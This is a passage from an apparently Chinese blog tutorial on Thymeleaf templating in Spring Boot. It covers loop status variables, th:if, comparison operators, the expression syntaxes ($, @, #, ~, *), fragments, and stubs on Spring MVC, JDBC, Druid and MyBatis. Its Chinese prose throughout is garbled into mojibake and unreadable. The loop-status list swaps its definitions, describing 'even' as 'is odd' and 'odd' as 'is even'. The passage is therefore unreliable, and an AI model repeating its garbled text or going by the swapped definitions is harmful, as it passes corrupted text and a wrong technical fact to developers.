class="line-numbers language-markup" data-language="markup"><code class="language-markup">indexï¼šåˆ—è¡¨çŠ¶æ€çš„åºå·ï¼Œä»0å¼€å§‹ï¼›countï¼šåˆ—è¡¨çŠ¶æ€çš„åºå·ï¼Œä»1å¼€å§‹ï¼›sizeï¼šåˆ—è¡¨çŠ¶æ€ï¼Œåˆ—è¡¨æ•°æ®æ¡æ•°ï¼›currentï¼šåˆ—è¡¨çŠ¶æ€ï¼Œå½“å‰æ•°æ®å¯¹è±¡evenï¼šåˆ—è¡¨çŠ¶æ€ï¼Œæ˜¯å¦ä¸ºå¥‡æ•°ï¼Œbooleanç±»å‹oddï¼šåˆ—è¡¨çŠ¶æ€ï¼Œæ˜¯å¦ä¸ºå¶æ•°ï¼Œbooleanç±»å‹firstï¼šåˆ—è¡¨çŠ¶æ€ï¼Œæ˜¯å¦ä¸ºç¬¬ä¸€æ¡ï¼Œbooleanç±»å‹lastï¼šåˆ—è¡¨çŠ¶æ€ï¼Œæ˜¯å¦ä¸ºæœ€åä¸€æ¡ï¼Œbooleanç±»å‹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><code>th:if</code>ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>Test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--th:if æ¡ä»¶åˆ¤æ–­ï¼Œç±»ä¼¼çš„æœ‰th:switchï¼Œth:caseï¼Œä¼˜å…ˆçº§ä»…æ¬¡äºth:each,--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;map.Boss.name&#125;<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">th:</span>if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;map.Boss.age gt 20&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…¶ä¸­çš„å…³ç³»è¿ç®—ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">gtï¼šgreat thanï¼ˆå¤§äºï¼‰geï¼šgreat equalï¼ˆå¤§äºç­‰äºï¼‰eqï¼šequalï¼ˆç­‰äºï¼‰ltï¼šless thanï¼ˆå°äºï¼‰leï¼šless equalï¼ˆå°äºç­‰äºï¼‰neï¼šnot equalï¼ˆä¸ç­‰äºï¼‰<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºbossçš„ageå±æ€§å¤§äº20ï¼Œæ‰€ä»¥ä¼šæ˜¾ç¤º</p><p><img src="/blog/2024/06/28/SpringBoot/image-20240709225027975.png" alt="image-20240709225027975"></p></li></ul></li></ol><hr><h5 id="æ ‡å‡†è¡¨è¾¾å¼è¯­æ³•"><a href="#æ ‡å‡†è¡¨è¾¾å¼è¯­æ³•" class="headerlink" title="æ ‡å‡†è¡¨è¾¾å¼è¯­æ³•"></a>æ ‡å‡†è¡¨è¾¾å¼è¯­æ³•</h5><p><code>$&#123;&#125;</code>ï¼šå˜é‡è¡¨è¾¾å¼ï¼Œæœ‰ä¸°å¯Œçš„å†…ç½®æ–¹æ³•</p><ul><li><p>å¯ä»¥è·å–å¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•</p></li><li><p>å¯ä»¥ä½¿ç”¨å†…ç½®å¯¹è±¡ï¼š</p><ul><li>ctxï¼šä¸Šä¸‹æ–‡å¯¹è±¡</li><li>varsï¼šä¸Šä¸‹æ–‡å˜é‡</li><li>localeï¼šä¸Šä¸‹æ–‡çš„è¯­è¨€ç¯å¢ƒ</li><li>requestï¼šä»…åœ¨webä¸Šä¸‹æ–‡çš„ HttpServletRequest å¯¹è±¡</li><li>responseï¼šä»…åœ¨webä¸Šä¸‹æ–‡çš„ HttpServletResponse å¯¹è±¡</li><li>sessionï¼šä»…åœ¨webä¸Šä¸‹æ–‡çš„ HttpSessionå¯¹è±¡</li><li>servletContextï¼šä»…åœ¨webä¸Šä¸‹æ–‡çš„ ServletContext å¯¹è±¡</li></ul><p>ä¾‹å­ï¼š</p><p>java ä»£ç å°†ç”¨æˆ·åæ”¾åœ¨sessionä¸­ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">session<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">"userinfo"</span><span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>htmlé‡ŒThymeleafé€šè¿‡å†…ç½®å¯¹è±¡ç›´æ¥è·å–ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">th:text="$&#123;session.userinfo&#125;"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>å¯ä»¥ä½¿ç”¨å†…ç½®æ–¹æ³•ï¼š</p><ul><li><p>datesï¼šæ—¥æœŸæ–¹æ³•ï¼Œå¸¸ç”¨çš„æ–¹æ³•æœ‰ï¼šformatï¼Œyearï¼Œmonthï¼Œhourï¼ŒcreateNowç­‰</p></li><li><p>numbersï¼šæ•°å€¼æ ¼å¼åŒ–æ–¹æ³•ï¼Œå¸¸ç”¨çš„æ–¹æ³•æœ‰ï¼šformatDecimalç­‰</p></li><li><p>stringsï¼šå­—ç¬¦ä¸²æ ¼å¼åŒ–æ–¹æ³•ï¼Œå¸¸ç”¨çš„Javaæ–¹æ³•å®ƒéƒ½æœ‰ã€‚æ¯”å¦‚ï¼šequalsï¼ŒequalsIgnoreCaseï¼Œlengthï¼Œtrimï¼ŒtoUpperCaseï¼ŒtoLowerCaseï¼ŒindexOfï¼Œsubstringï¼Œreplaceï¼ŒstartsWithï¼ŒendsWithï¼Œcontainsï¼ŒcontainsIgnoreCaseç­‰</p></li><li><p>boolsï¼šå¸ƒå°”æ–¹æ³•ï¼Œå¸¸ç”¨çš„æ–¹æ³•æœ‰ï¼šisTrueï¼ŒisFalseç­‰</p></li><li><p>arraysï¼šæ•°ç»„æ–¹æ³•ï¼Œå¸¸ç”¨çš„æ–¹æ³•æœ‰ï¼štoArrayï¼Œlengthï¼ŒisEmptyï¼Œcontainsï¼ŒcontainsAllç­‰</p></li><li><p>listsï¼Œsetsï¼šé›†åˆæ–¹æ³•ï¼Œå¸¸ç”¨çš„æ–¹æ³•æœ‰ï¼štoListï¼Œsizeï¼ŒisEmptyï¼Œcontainsï¼ŒcontainsAllï¼Œsortç­‰</p></li><li><p>mapsï¼šå¯¹è±¡æ–¹æ³•ï¼Œå¸¸ç”¨çš„æ–¹æ³•æœ‰ï¼šsizeï¼ŒisEmptyï¼ŒcontainsKeyï¼ŒcontainsValueç­‰</p></li></ul><p>ä¾‹å­ï¼š </p><p>åœ¨controllerä¸­ç»‘å®šå­—ç¬¦ä¸²</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">model<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span><span class="token string">"itdragonStr"</span><span class="token punctuation">,</span><span class="token string">"this is a DEMO"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>htmlä¸­ä½¿ç”¨å†…ç½®æ–¹æ³•ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span>#strings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;not #strings.isEmpty(itdragonStr)&#125;<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Old Str : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;itdragonStr&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>toUpperCase : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.toUpperCase(itdragonStr)&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>toLowerCase : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.toLowerCase(itdragonStr)&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>equals : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.equals(itdragonStr, 'itdragonblog')&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>equalsIgnoreCase : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.equalsIgnoreCase(itdragonStr, 'itdragonblog')&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>indexOf : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.indexOf(itdragonStr, 'r')&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>substring : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.substring(itdragonStr, 2, 8)&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>replace : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.replace(itdragonStr, 'it', 'IT')&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>startsWith : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.startsWith(itdragonStr, 'it')&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>contains : <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;#strings.contains(itdragonStr, 'IT')&#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/06/28/SpringBoot/image-20240709231850749.png" alt="image-20240709231850749"></p></li></ul><br><p><code>@&#123;&#125;</code>ï¼šé“¾æ¥è¡¨è¾¾å¼</p><ul><li>æ— å‚ï¼š<code>@&#123;/xxx&#125;</code></li><li>æœ‰å‚ï¼š<code>@&#123;/xxx(k1=v1,k2=v2)&#125;</code> ï¼Œå¯¹åº”urlç»“æ„ï¼š<code>xxx?k1=v1&amp;k2=v2</code></li><li>å¼•å…¥æœ¬åœ°èµ„æºï¼š<code>@&#123;/é¡¹ç›®æœ¬åœ°çš„èµ„æºè·¯å¾„&#125;</code></li><li>å¼•å…¥å¤–éƒ¨èµ„æºï¼š<code>@&#123;/webjars/èµ„æºåœ¨jaråŒ…ä¸­çš„è·¯å¾„&#125;</code></li></ul><p>ä¾‹å­ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>å¼•å…¥å¤–éƒ¨èµ„æº<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>link th<span class="token operator">:</span>href<span class="token operator">=</span><span class="token string">"@&#123;/webjars/bootstrap/4.0.0/css/bootstrap.css&#125;"</span> rel<span class="token operator">=</span><span class="token string">"stylesheet"</span><span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>å¼•å…¥æœ¬åœ°èµ„æº<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>link th<span class="token operator">:</span>href<span class="token operator">=</span><span class="token string">"@&#123;/main/css/itdragon.css&#125;"</span> rel<span class="token operator">=</span><span class="token string">"stylesheet"</span><span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>è¡¨å•æäº¤è·¯å¾„<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>form <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"form-login"</span> th<span class="token operator">:</span>action<span class="token operator">=</span><span class="token string">"@&#123;/user/login&#125;"</span> th<span class="token operator">:</span>method<span class="token operator">=</span><span class="token string">"post"</span> <span class="token operator">></span> <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>è¶…é“¾æ¥è·³è½¬è·¯å¾„é™„å¸¦å‚æ•°<span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span>a <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"btn btn-sm"</span> th<span class="token operator">:</span>href<span class="token operator">=</span><span class="token string">"@&#123;/login.html(l='zh_CN')&#125;"</span><span class="token operator">></span>ä¸­æ–‡<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span class="token operator">&lt;</span>a <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"btn btn-sm"</span> th<span class="token operator">:</span>href<span class="token operator">=</span><span class="token string">"@&#123;/login.html(l='en_US')&#125;"</span><span class="token operator">></span><span class="token class-name">English</span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><code>#&#123;&#125;</code>ï¼šæ¶ˆæ¯è¡¨è¾¾å¼ï¼Œç”¨æ¥è¯»å–é…ç½®æ–‡ä»¶ï¼ˆé€šå¸¸æ˜¯.propertiesæ–‡ä»¶ï¼‰ä¸­çš„æ•°æ®ï¼Œ<code>th:text=&quot;#&#123;msg&#125;&quot;</code></p><br><p><code>~&#123;&#125;</code>ï¼šä»£ç å—è¡¨è¾¾å¼ï¼Œå¯ä»¥ç”¨äºå¼•ç”¨å…¬å…±çš„ç›®æ ‡ç‰‡æ®µã€‚æ”¯æŒä¸¤ç§ç»“æ„ï¼š<code>~&#123;templatename::fragmentname&#125;</code>å’Œ<code>~&#123;templatename::#id&#125;</code></p><ul><li>templatenameï¼šæ¨¡ç‰ˆåï¼ŒThymeleafä¼šæ ¹æ®æ¨¡ç‰ˆåè§£æå®Œæ•´è·¯å¾„ï¼š<code>/resources/templates/templatename.html</code>ï¼Œè¦æ³¨æ„æ–‡ä»¶çš„è·¯å¾„</li><li>fragmentnameï¼šç‰‡æ®µåï¼ŒThymeleafé€šè¿‡<code>th:fragment</code>å£°æ˜å®šä¹‰ä»£ç å—ï¼Œå³ï¼š<code>th:fragment=&quot;fragmentname&quot;</code></li><li>idï¼šHTMLçš„idé€‰æ‹©å™¨ï¼Œä½¿ç”¨æ—¶è¦åœ¨å‰é¢åŠ ä¸Š#å·ï¼Œä¸æ”¯æŒclassé€‰æ‹©å™¨</li></ul><p>ä½¿ç”¨æ—¶è¦é…åˆthå±æ€§ï¼ˆth:insertï¼Œth:replaceï¼Œth:includeï¼‰ä¸€èµ·ä½¿ç”¨ï¼š</p><ul><li><code>th:insert</code>ï¼šå°†ä»£ç å—ç‰‡æ®µæ•´ä¸ªæ’å…¥åˆ°ä½¿ç”¨äº†th:insertçš„HTMLæ ‡ç­¾ä¸­</li><li><code>th:replace</code>ï¼šå°†ä»£ç å—ç‰‡æ®µæ•´ä¸ªæ›¿æ¢ä½¿ç”¨äº†th:replaceçš„HTMLæ ‡ç­¾ä¸­</li><li><code>th:include</code>ï¼šå°†ä»£ç å—ç‰‡æ®µåŒ…å«çš„å†…å®¹æ’å…¥åˆ°ä½¿ç”¨äº†th:includeçš„HTMLæ ‡ç­¾ä¸­</li></ul><p>ä¾‹å­ï¼šåœ¨ä¸€ä¸ª<code>template/footer.html</code>ä¸­å®šä¹‰ä¸‹é¢çš„ç‰‡æ®µï¼Œå¹¶åœ¨å¦ä¸€ä¸ªtemplateä¸­å¼•ç”¨</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--th:fragmentå®šä¹‰ä»£ç å—æ ‡è¯†--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span> <span class="token attr-name"><span class="token namespace">th:</span>fragment</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>copy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&copy;">&amp;copy;</span> 2019 The Good Thymes Virtual Grocery<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--ä¸‰ç§ä¸åŒçš„å¼•å…¥æ–¹å¼--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>insert</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>footer :: copy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>replace</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>footer :: copy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>include</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>footer :: copy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è€Œæ¸²æŸ“åçš„ç»“æœæ˜¯ï¼š</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!--th:insertæ˜¯åœ¨divä¸­æ’å…¥ä»£ç å—ï¼Œå³å¤šäº†ä¸€å±‚div--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span><span class="token punctuation">></span></span>    <span class="token entity named-entity" title="&copy;">&amp;copy;</span> 2019 The Good Thymes Virtual Grocery    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--th:replaceæ˜¯å°†ä»£ç å—ä»£æ›¿å½“å‰divï¼Œå…¶htmlç»“æ„å’Œä¹‹å‰ä¸€è‡´--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>footer</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&copy;">&amp;copy;</span> 2019 The Good Thymes Virtual Grocery<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>footer</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--th:includeæ˜¯å°†ä»£ç å—footerçš„å†…å®¹æ’å…¥åˆ°divä¸­ï¼Œå³å°‘äº†ä¸€å±‚footer--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&copy;">&amp;copy;</span> 2019 The Good Thymes Virtual Grocery<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><code>*&#123;&#125;</code>ï¼šé€‰æ‹©å˜é‡è¡¨è¾¾å¼ï¼Œ<code>*&#123;&#125;</code>åªå¯¹<strong>é€‰å®šå¯¹è±¡</strong>è¯„ä¼°è¡¨è¾¾å¼è€Œä¸æ˜¯æ•´ä¸ªä¸Šä¸‹æ–‡ã€‚åªè¦æ²¡æœ‰é€‰å®šçš„å¯¹è±¡ï¼Œ<code>$&#123;...&#125;</code>å’Œ<code>*&#123;...&#125;</code>çš„è¯­æ³•å°±å®Œå…¨ä¸€æ ·</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name"><span class="token namespace">th:</span>object</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>$&#123;user&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Name: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>*&#123;name&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>èµ›<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Age: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>*&#123;age&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>18<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Detail: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name"><span class="token namespace">th:</span>text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>*&#123;detail&#125;<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>å¥½å¥½å­¦ä¹ <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h5 id="é¢„å¤„ç†è¡¨è¾¾å¼"><a href="#é¢„å¤„ç†è¡¨è¾¾å¼" class="headerlink" title="é¢„å¤„ç†è¡¨è¾¾å¼"></a>é¢„å¤„ç†è¡¨è¾¾å¼</h5><p>è¯­æ³•ï¼š<code>__$&#123;expression&#125;__</code></p><blockquote><p>é¢„å¤„ç†æ˜¯åœ¨<strong>æ­£å¸¸è¡¨è¾¾å¼ä¹‹å‰å®Œæˆ</strong>çš„è¡¨è¾¾å¼çš„æ‰§è¡Œï¼Œå…è®¸ä¿®æ”¹æœ€ç»ˆå°†æ‰§è¡Œçš„è¡¨è¾¾å¼</p></blockquote><hr><h3 id="è£…é…æ‰©å±•SpringMVC"><a href="#è£…é…æ‰©å±•SpringMVC" class="headerlink" title="è£…é…æ‰©å±•SpringMVC"></a>è£…é…æ‰©å±•SpringMVC</h3><p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://docs.spring.io/spring-boot/docs/2.0.x/reference/html/boot-features-developing-web-applications.html">https://docs.spring.io/spring-boot/docs/2.0.x/reference/html/boot-features-developing-web-applications.html</a></p><blockquote><p>Spring MVC å…è®¸åˆ›å»ºç‰¹æ®Š <code>@Controller</code> æˆ– <code>@RestController</code> Bean æ¥å¤„ç†ä¼ å…¥çš„ HTTP è¯·æ±‚ã€‚æ§åˆ¶å™¨ä¸­çš„æ–¹æ³•ä½¿ç”¨ <code>@RequestMapping</code> æ³¨è§£æ˜ å°„åˆ° HTTP</p></blockquote><p>è€ŒSpring Boot ä¸º Spring MVC æä¾›äº†è‡ªåŠ¨é…ç½®</p><p>è¿™ä¸ªæ„Ÿè§‰æš‚æ—¶ç”¨ä¸åˆ°ï¼Œå…ˆæŒ‚èµ·</p><h4 id="Configurationé…ç½®"><a href="#Configurationé…ç½®" class="headerlink" title="Configurationé…ç½®"></a>Configurationé…ç½®</h4><p>æˆ‘ä»¬å¯ä»¥åœ¨ä¸€ä¸ªç±»ä¸ŠåŠ ä¸Š<code>@configuration</code>æ³¨è§£ï¼Œæ¥ä»£è¡¨ä¸€ä¸ªé…ç½®ç±»ï¼Œé…ç½®ç±»å¯ä»¥é…ç½®æ‹¦æˆªå™¨ï¼Œç­‰ç­‰<br>å¹¶ä¸”æˆ‘ä»¬éœ€è¦å®ç°<code>WebMvcConfigurer</code>æ¥å£</p><hr><h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><hr><h2 id="Druid"><a href="#Druid" class="headerlink" title="Druid"></a>Druid</h2><blockquote><p>Druid æ˜¯ä¸€ä¸ª JDBC ç»„ä»¶åº“ï¼ŒåŒ…å«æ•°æ®åº“è¿æ¥æ± ã€SQL Parser ç­‰ç»„ä»¶</p></blockquote><hr><h2 id="Mybatis"><a 